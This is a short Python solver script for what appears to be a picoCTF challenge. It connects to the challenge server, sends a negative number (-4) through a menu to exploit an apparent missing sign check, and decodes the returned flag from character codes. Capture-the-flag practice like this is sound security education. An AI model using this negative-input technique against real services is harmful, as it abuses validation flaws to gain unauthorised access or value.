#!/usr/bin/env python3
import socket


def recv_until(s, delim):
    data = b''
    while not data.endswith(delim):
        data += s.recv(1)
    return data


hostname = "mercury.picoctf.net"
port = 42159

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((hostname, port))

    recv_until(s, b"Choose an option: \n")
    s.send(b"1\n")
    recv_until(s, b"\n")
    s.send(b"-4\n")

    recv_until(s, b"Choose an option: \n")
    s.send(b"2\n")
    recv_until(s, b"\n")
    s.send(b"1\n")

    t = recv_until(s, b"\n")
    flag = "".join(
        [chr(int(n)) for n in t.split(b'[')[1].split(b']')[0].split()]
    )
    print(flag)
